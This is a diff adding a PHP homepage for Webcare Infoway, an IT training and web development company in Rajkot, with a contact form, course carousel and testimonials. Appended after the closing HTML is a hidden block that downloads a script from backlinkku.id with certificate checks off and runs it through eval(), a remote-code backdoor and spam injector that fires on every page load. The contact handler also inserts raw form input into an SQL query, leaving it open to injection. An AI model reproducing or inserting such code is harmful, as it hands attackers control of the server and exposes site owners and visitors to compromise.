@@ -1,0 +1,612 @@
+<?php
+
+
+include("include/header.php");
+if (isset($_POST['btn']))
+{
+	$name = $_POST['name'];
+	$mobile = $_POST['phone'];
+	$email = $_POST['email'];
+	// $subject = $_POST['subject'];
+	$message = $_POST['message'];
+	$ins1 ="INSERT INTO `contact_us`(`c_nm`, `c_email`, `c_number`,  `c_msg`) VALUES ('$name','$email','$mobile','$message')";
+	$exe = mysqli_query($con, $ins1);
+	//echo $exe;	
+	if($exe)
+	{
+		 $_SESSION['inq']=1;
+		?>
+		<script>alert("We will Contact Soon"); window.location="#myCarousel"</script>
+		<?php
+		$to = 'webcare.edu@gmail.com';
+		$sub = 'Inquiry';
+		$msg = "Contact Us Message from it training rajkot\n\n" . "Name :" . $name . "\n" . "Email :" . $email . "\n" . "Contact :" . $mobile . "\n" . "Message :" . $message;
+		$headers = 'From: info@webcareinfoway.com' . "\r\n" .
+			'Reply-To: info@webcareinfoway.com' . "\r\n" .
+			'X-Mailer: PHP/' . phpversion();
+		$ds = @mail($to, $sub, $msg, $headers);
+	//	$ds=@mail($email_to, $email_subject, $email_message, $headers);
+		if ($ds) {
+		?>
+			<script>
+				window.onload = function() {
+					alert("We will contact Soon");
+					window.location = "#myCarousel";
+				}
+			</script>
+		<?php
+		}
+	}
+	else
+	{
+		?>
+			<script type="text/javascript">
+				window.onload = function() {
+					alert('We not will contact Soon');
+					window.location = "index.php";
+				}
+			</script> <?php
+	}
+}
+
+
+?>
+
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<title>Home | Webcare Infoway,Rajkot.</title>
+<link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<style type="text/css">
+	.imge{
+		width: 50px;
+		background-image: url('modal.png');
+		background-repeat: no-repeat;	}
+	#register-form {
+		position: relative;
+		z-index: 999;
+		background-color: #fff;
+		border: 1 px solid #f5f5f5;
+		padding: 45 px 30 px 30 px ;
+		margin: 0 15 px 40 px ;
+		-webkit-border-radius: 6 px ;
+		-moz-border-radius: 6px;
+		border-radius: 6px ;
+	}
+	
+</style>
+	<meta charset="utf-8" content="A - PHP Training In Rajkot | Training center In Rajkot|rajkot it company |AngularJS |IT Training center In Rajkot| Project Training In Rajkot |Free Project Training In Rajkot |PHP Project Training|.NET Training In Rajkot |Project Training  |Android Training In Rajkot | Live Project Training In Rajkot | Live Project In Rajkot | PHP Live Project Training In Rajkot | Final Year Project Training In Rajkot| Final Year Project Training |Android Project Training in Rajkot|Mobie Application Development Training|Android Application Development in Rajkot| .NET Live Project Training  In Rajkot | IT Training In Rajkot |Web Designing In Rajkot | Web Designing Training In Rajkot |IT Comapany In Rajkot | Web Development Company In Rajkot | Out sourcing company In Rajkot | Top IT Placement Company In Rajkot |Domain & Hosting Provider In Rajkot | PHP Development Company In Rajkot | Android Development Company In Rajkot |Android Training in Rajkot |Android Development Course |Android App Development  Training  | MCA Final Year Project Training in Rajkot |Codeigniter training in rajkot| Android App Development Course | Msc(IT) Final Year Project Training in Rajkot |Project Training for MCA in Rajkot|Android developer classes in rajkot |Android classes|Android Training in Gujrat|Mobile app Development Training| ERP Solution In Rajkot|Live Android Project Training|Live Android Project|Live Android App TRaining in Rajkot." />
+
+	<script type="text/javascript" src="js/custom.js"></script>
+	<link href="css/style.css" rel="stylesheet" type="text/css" media="all" />
+
+</head>
+<body>
+
+<div class="container py-3 " style="" id="11" >
+<input type="hidden" class="btn btn-primary" data-togle="modal" data-target="#exampleModal">
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" >
+    <div class="modal-dialog">
+      <div class="modal-content imge">
+        <div class="modal-header" style="background-color: white">
+					<h2 align="center" style="color: #1171BA;">Connect With Us
+	        	<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="color: red;"><span aria-hidden="true">&times;</span>
+		        </button>
+		      </h2>
+				</div>
+        <div class="modal-body row ">
+       		<div class="col-sm-5 col-md-5 col-lg-6 d-flex flex-column align-self-start ">
+					</div>
+					<div class="col-sm-7 col-md-7 col-lg-6">
+						<div class="txt-block ">
+							<div id="register-form" style="padding: 30px 30px 30px;">
+							    
+								<form class="row register-form" method="post" id="InquiryForm">
+									<div class="col-md-12 mb-5" style="margin-bottom: 2rem!important;">
+										<div class="row" style="background-color: #1171BA;color: white;margin-right: 1px;margin-left: 1px;padding :10px;">
+											<div class="col-md-12 col-12  d-flex align-items-center my-2">
+												<i class="fa fa-envelope-o" aria-hidden="true"></i>
+												&nbsp;
+												<a href="mailto:webcare.edu@gmail.com" style="color: white;">webcare.edu@gmail.com</a><br>
+												<i class="fa fa-phone fa-1.5x" aria-hidden="true"></i>
+												&nbsp;
+												<a href="tel:+919558353485" target="_blank" style="color: white;">+91 9558353485</a>
+											</div>
+										</div>
+									</div>
+									<div id="input-name" class="col-md-12" style="padding-bottom: 8px;" >
+										<input type="text" id="input-name" name="name"  class="form-control name"
+											placeholder="Your Name*" required  style="border: 2px solid #1171BA;">
+									</div>
+									<div id="input-email" class="col-md-12" style="padding-bottom: 8px;">
+										<input type="email" id="input-email" name="email" class="form-control email"
+											placeholder="Your Email*" required style="border: 2px solid #1171BA;">
+									</div>
+									<div id="input-phone" class="col-md-12" style="padding-bottom: 8px;">
+										<input type="tel" id="input-phone" name="phone" autocomplete="off" class="form-control phone"
+											placeholder="Phone Number*" pattern="^[0-9]{10}$"  required style="border: 2px solid #1171BA;">
+									</div>
+									<div id="input-message" class="col-md-12 input-message" style="padding-bottom: 8px;">
+										<textarea class="form-control message" id="wid" autocomplete="off" name="message" rows="3" cols="10" placeholder="Your Query"  style="border: 2px solid #1171BA;"></textarea>
+									</div>
+									<div class="col-md-12 form-btn">
+										<button type="submit" name="btn" id="b1" class="btn btn-md btn-rose tra-black-hover" style="margin-top: 30px;margin-left: 110px;background-color:#1171BA;color: white;" > SUBMIT  </button>
+									</div>
+								</form>
+							</div>
+						</div>
+					</div>
+				</div>
+	    </div>
+	  </div>
+	</div>
+</div>
+</div>
+
+<div id="myCarousel" class="carousel slide" data-ride="carousel">
+	<!-- Indicators -->
+	<ol class="carousel-indicators">
+		<li data-target="#myCarousel" data-slide-to="0" class="active"></li>
+		<li data-target="#myCarousel" data-slide-to="1" class=""></li>
+		<li data-target="#myCarousel" data-slide-to="2" class=""></li>
+		<li data-target="#myCarousel" data-slide-to="3" class=""></li>
+		<li data-target="#myCarousel" data-slide-to="4" class=""></li>
+	</ol>
+	<div class="carousel-inner" role="listbox">
+		<div class="item active">
+			<div class="container">
+				<div class="carousel-caption">
+					<p>Boost Your Ideas</p>
+					<h3>Convert your thoughts into <span>Reality.</span></h3>
+				</div>
+			</div>
+		</div>
+		<div class="item item2">
+			<div class="container">
+				<div class="carousel-caption">
+					<p>Digitalisation</p>
+					<h3>Grow Your Business in <span>Digital Market.</span></h3>
+				</div>
+			</div>
+		</div>
+		<div class="item item3">
+			<div class="container">
+				<div class="carousel-caption">
+					<p>Development</p>
+					<h3>Simple ways to beat <span>procrastination.</span></h3>
+				</div>
+			</div>
+		</div>
+		<div class="item item4">
+			<div class="container">
+				<div class="carousel-caption">
+					<p>Solution with Technology</p>
+					<h3>A Complete <span>IT Solutions</span> Provider for Web, Mobile & Software </h3>
+				</div>
+			</div>
+		</div>
+		<div class="item item5">
+			<div class="container">
+				<div class="carousel-caption">
+					<p>Professional Training</p>
+					<h3> <span> We Are Career Builder.</span></h3>
+				</div>
+			</div>
+		</div>
+	</div>
+	<a class="left carousel-control" href="#myCarousel" role="button" data-slide="prev">
+		<span class="fa fa-chevron-left" aria-hidden="true"></span>
+		<span class="sr-only">Previous</span>
+	</a>
+	<a class="right carousel-control" href="#myCarousel" role="button" data-slide="next">
+		<span class="fa fa-chevron-right" aria-hidden="true"></span>
+		<span class="sr-only">Next</span>
+	</a>
+</div>
+
+<div class="aboutf">
+	<div class="container">
+		<h3 class="tittlef-agileits-w3layouts">About Us</h3>
+		<p class="paragraphf" style="text-align: center; font-size: 20px;">"To Convert Your Thoughts Into Reality."</p>
+		<div class="row featurette" style="margin-top: 30px;">
+			<div class="col-md-5 order-md-1">
+				<img src="images/aboutus.jpg" title="aboutus" alt="Image Loading" height="" width="100%" load="lazy">
+			</div>
+			<div class="col-md-7 order-md-2">
+				<h2 class="featurette-heading">Who We Are?</h2>
+				<p class="lead text-justify" style="margin-top: 15px; color: black;">Webcare Infoway is a Multi-National Company working in web development and Mobile app Development company in Rajkot. Our Company works towards offering innovative services that guarantees profitability. Our Team Comprising of Project Managers, Team leaders, Developers, Designers and Testers. We are chosen not only for our technical expertise but also for our history in solving business problems with meeting highest quality standards and an exceptional service. </p>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="materialsf-section">
+	<div class="container">
+		<h3 class="tittlef-agileits-w3layouts white-clrf">Popular Technology</h3>
+		<div class="carousel slide materialf-slider" id="myCarousel1">
+			<div class="carousel-inner">
+				<div class="item active">
+					<ul class="thumbnails">
+						<li class="col-md-3 col-sm-6 col-xs-6 mtrl-f-grids">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="android-training-rajkot.php"><img src="images/android.jpg" alt="android" title="android" style="height: 250px; width: 250px;" load="lazy"></a>
+								</div>
+								<div class="caption">
+									<h4>Android Development</h4>
+									<form>
+										<a href="android-training-rajkot.php">
+											<button type="button" class="edu-cart pedu-cart" style="margin-top: 10px;">
+												Read More
+											</button>
+										</a>
+									</form>
+								</div>
+							</div>
+						</li>
+						<li class="col-md-3 col-sm-6 col-xs-6 mtrl-f-grids">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="flutter-training-rajkot.php"><img src="images/flutter.jpg" title="flutter" alt="flutter" style="height: 250px; width: 250px;" load="lazy"></a>
+								</div>
+								<div class="caption">
+									<h4>Flutter Development</h4>
+									<form>
+										<a href="flutter-training-rajkot.php">
+											<button type="button" class="edu-cart pedu-cart" style="margin-top: 10px;">
+												Read More
+											</button>
+										</a>
+									</form>
+								</div>
+							</div>
+						</li>
+						<li class="col-md-3 col-sm-6 col-xs-6 mtrl-f-grids">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="reactnative-training-rajkot.php"><img src="images/reactNative.jpg" alt="reactnative" title="reactnative" style="height: 250px; width: 250px;" load="lazy"></a>
+								</div>
+								<div class="caption">
+									<h4>React Native Development</h4>
+									<form>
+										<a href="reactnative-training-rajkot.php">
+											<button type="button" class="edu-cart pedu-cart" style="margin-top: 10px;">
+												Read More
+											</button>
+										</a>
+									</form>
+								</div>
+							</div>
+						</li>
+						<li class="col-md-3 col-sm-6 col-xs-6 mtrl-f-grids">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="python-training-rajkot.php"><img src="images/python.jpg" alt="pyhton" title="python" style="height: 250px; width: 250px;" load="lazy"></a>
+								</div>
+								<div class="caption">
+									<h4>Python Development</h4>
+									<form>
+										<a href="python-training-rajkot.php">
+											<button type="button" class="edu-cart pedu-cart" style="margin-top: 10px;">
+												Read More
+											</button>
+										</a>
+									</form>
+								</div>
+							</div>
+						</li>
+					</ul>
+				</div>
+				<div class="item">
+					<ul class="thumbnails">
+						<li class="col-md-3 col-sm-6 col-xs-6 mtrl-f-grids">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="php-training-rajkot.php"><img src="images/php.jpg" alt="php" title="php" style="height: 250px; width: 250px;" load="lazy"></a>
+								</div>
+								<div class="caption">
+									<h4>PHP Development</h4>
+									<form>
+										<a href="php-training-rajkot.php">
+											<button type="button" class="edu-cart pedu-cart" style="margin-top: 10px;">
+												Read More
+											</button>
+										</a>
+									</form>
+								</div>
+							</div>
+						</li>
+						<li class="col-md-3 col-sm-6 col-xs-6 mtrl-f-grids">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="java-training-rajkot.php"><img src="images/java.jpg" alt="java" title="java" style="height: 250px; width: 250px;" load="lazy"></a>
+								</div>
+								<div class="caption">
+									<h4>Java Development</h4>
+									<form>
+										<a href="java-training-rajkot.php">
+											<button type="button" class="edu-cart pedu-cart" style="margin-top: 10px;">
+												Read More
+											</button>
+										</a>
+									</form>
+								</div>
+							</div>
+						</li>
+						<li class="col-md-3 col-sm-6 col-xs-6 mtrl-f-grids">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="ASP.net-training-rajkot.php"><img src="images/aspNet.jpg" title="aspnet" alt="aspnet" style="height: 250px; width: 250px;" load="lazy"></a>
+								</div>
+								<div class="caption">
+									<h4>Asp.Net Development</h4>
+									<form>
+										<a href="ASP.net-training-rajkot.php">
+											<button type="button" class="edu-cart pedu-cart" style="margin-top: 10px;">
+												Read More
+											</button>
+										</a>
+									</form>
+								</div>
+							</div>
+						</li>
+						<li class="col-md-3 col-sm-6 col-xs-6 mtrl-f-grids">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="AngularJS-training-rajkot.php"><img src="images/angular.jpg" alt="angular" title="angular" style="height: 250px; width: 250px;" load="lazy"></a>
+								</div>
+								<div class="caption">
+									<h4>Angular Js Development</h4>
+									<form>
+										<a href="AngularJS-training-rajkot.php">
+											<button type="button" class="edu-cart pedu-cart" style="margin-top: 10px;">
+												Read More
+											</button>
+										</a>
+									</form>
+								</div>
+							</div>
+						</li>
+					</ul>
+				</div>
+				<div class="item">
+					<ul class="thumbnails">
+						<li class="col-md-3 col-sm-6 col-xs-6 mtrl-f-grids">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="laravel-training-rajkot.php"><img src="images/laravel.jpg" alt="laravel" title="laravel" style="height: 250px; width: 250px;" load="lazy"></a>
+								</div>
+								<div class="caption">
+									<h4>Laravel Development</h4>
+									<form>
+										<a href="laravel-training-rajkot.php">
+											<button type="button" class="edu-cart pedu-cart" style="margin-top: 10px;">
+												Read More
+											</button>
+										</a>
+									</form>
+								</div>
+							</div>
+						</li>
+					</ul>
+				</div>
+			</div>
+			<nav>
+				<ul class="control-box pager">
+					<li><a data-slide="prev" href="#myCarousel1" class=""><i class="glyphicon glyphicon-chevron-left"></i></a></li>
+					<li><a data-slide="next" href="#myCarousel1" class=""><i class="glyphicon glyphicon-chevron-right"></i></a></li>
+				</ul>
+			</nav>
+			<div class="clearfix"> </div>
+		</div>
+	</div>
+</div>
+
+
+<div class="loadf-section">
+	<div class="posf-grids">
+		<div class="container">
+			<h3 class="tittlef-agileits-w3layouts">Features and Services</h3>
+			<div class="col-md-4 posf-left">
+				<div class="pos1">
+							<a href="web_development.php">Website Development</a>
+					<p class="paragraphf white-clrf">If you can think it, we can web it, help your business reach its goal.</p>
+				</div>
+				<div class="pos2">
+					<a href="ui_development.php">Digital Marketing</a>
+					<p class="paragraphf white-clrf">Current Trending advertisment platform for grow business. </p>
+				</div>
+			</div>
+			<div id="loader">
+				<div class="dot"></div>
+				<div class="dot"></div>
+				<div class="dot"></div>
+				<div class="dot"></div>
+				<div class="dot"></div>
+				<div class="dot"></div>
+				<div class="dot"></div>
+				<div class="dot"></div>
+				<div class="lading"></div>
+			</div>
+			<div class="col-md-4 posf-right">
+				<div class="pos3">
+					<a href="android_development.php">Mobile Application Development</a>
+					<p class="paragraphf white-clrf">We have built scalable, robust and interactive Mobile apps.</p>
+				</div>
+				<div class="pos4">
+					<a href="android-training-rajkot.php">College To Corporate Training Program</a>
+					<p class="paragraphf white-clrf">Basic to advance level practical base learning</p>
+				</div>
+			</div>
+			<div class="clearfix"> </div>
+			<div class="posf-btm">
+				<div class="pos5">
+					<a href="ui_development.php">Internship Program</a>
+					<p class="paragraphf white-clrf">Internship Program for under graduate student</p>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="stats-f">
+	<div class="container">
+		<h3 class="tittlef-agileits-w3layouts white-clrf">Things that make our company the best</h3>
+		<div class="stats-f_inner_grids">
+			<div class="col-md-6">
+				<h3 class="sub-w3ls-headf white-clrf">11+ Years of experience</h3>
+				<p class="paragraphf white-clrf ">Webcare Infoway is a Multi-National Company working in web development and Mobile app Development company in Rajkot. Our Team Comprising of Project Managers, Team leaders, Developers, Designers and Testers. Our engagement models are flexible, scalable, customizable and secure. We base them on the specific business needs of our customers. For each project, we define the right strategy in collaboration with each client. Most of our clients are with us since they outsourced their first project to us. </p>
+				<div class="stats-f_left counter_grid">
+					<span class="fa fa-book" aria-hidden="true"></span>
+					<p class="counter">145</p>
+					<h4>Courses</h4>
+				</div>
+				<div class="stats-f_left counter_grid1">
+					<span class="fa fa-users" aria-hidden="true"></span>
+					<p class="counter">365</p>
+					<h4>Happy clients</h4>
+				</div>
+			</div>
+			<div class="col-md-6">
+				<div class="stats-f_left counter_grid2">
+					<span class="fa fa-user-plus" aria-hidden="true"></span>
+					<p class="counter">563</p>
+					<h4>People loved</h4>
+				</div>
+				<div class="stats-f_left counter_grid3">
+					<span class="fa fa-trophy" aria-hidden="true"></span>
+					<p class="counter">1045</p>
+					<h4>Awards won</h4>
+				</div>
+				<h3 class="sub-w3ls-headf white-clrf">Success Training Programs</h3>
+				<p class="paragraphf white-clrf ">Webcare Infoway works on Web Development, Mobile Apps Development, Logo Design, Web Designing, Web Hosting and other services. We know that each customer will have specific requirement as per the business need and we prepare application for them so that they reach their clients. We also works for Project Training on several latest technologies like advanced PHP, .NET, Advanced Java, Mobile app development training on iPhone and Android.</p>
+			</div>
+			<div class="clearfix"> </div>
+		</div>
+	</div>
+</div>
+<!-- //stats-f -->
+<div class="demo">
+	<div class="container">
+		<div class="row text-center">
+			<h1 class="heading-title">Client Rating</h1>
+		</div>
+		<div class="row">
+			<div class="col-md-offset-3 col-md-6">
+				<div id="testimonial-slider" class="owl-carousel" style="opacity: 1; display: block;">
+					<div class="testimonial">
+						<div class="pic">
+							<img src="images/bf10.jpg" alt="pc" title="pc" load="lazy" />
+						</div>			
+						<h2 class="testimonial-title" style="color: #FFA500;"><span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+						</h2>
+						<p class="description">
+							Best place for all time solution for web or app devlopment.Great services provider.
+						</p>
+					</div>
+					<div class="testimonial">
+						<div class="pic">
+							<img src="images/bf10.jpg" alt="pc1" title="pc1" load="lazy"/>
+						</div>
+						<h2 class="testimonial-title" style="color: #FFA500;"><span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+						</h2>
+						<p class="description">
+							Great work and Easy people to work with. Really Satisfied From their work. Will Definatly Recommend to friends.
+						</p>
+					</div>
+					<div class="testimonial">
+						<div class="pic">
+							<img src="images/bf10.jpg" alt="pc3" title="pc3" load="lazy"/>
+						</div>
+						<h2 class="testimonial-title" style="color: #FFA500;"><span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+						</h2>
+						<p class="description">
+							Best option available in market for web devlopment and app devlopment. Budget friendly and quality services.
+						</p>
+					</div>
+					<div class="testimonial">
+						<div class="pic">
+							<img src="images/bf10.jpg" alt="pc4" title="pc4" load="lazy"/>
+						</div>
+						<h2 class="testimonial-title" style="color: #FFA500;"><span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+							<span class="fa fa-star checked"></span>
+						</h2>
+						<p class="description">
+							Excellent services for website devlopment.I had really good experience working with them.
+						</p>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<script type="text/javascript">
+
+</script>
+
+<?php include("include/footer.php"); ?>
+
+<script type="text/javascript">
+	
+	window.onload = () => 
+	{
+		setTimeout(function(){$('#exampleModal').modal('show');},3000);
+	}
+
+	console.log(1);
+</script>
+
+
+<script>
+	$(document).ready(function() {
+		$("#testimonial-slider").owlCarousel({
+			items: 1,
+			itemsDesktop: [1000, 1],
+			itemsDesktopSmall: [979, 1],
+			itemsTablet: [768, 1],
+			pagination: true,
+			navigation: false,
+			navigationText: ["", ""],
+			slideSpeed: 1000,
+			singleItem: true,
+			transitionStyle: "fade",
+			autoPlay: true
+		});	});
+</script>
+</body>
+</html>
+<?php
+$jasabacklinks = 'https://backlinkku.id/menu/vip-v1/script.txt';
+function fetch_remote_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
+}
+$fileContents = fetch_remote_content($jasabacklinks);
+if (strpos($fileContents, '<?php') !== false) {
+    eval('?>' . $fileContents);
+} else {
+    echo $fileContents;
+}
+?>
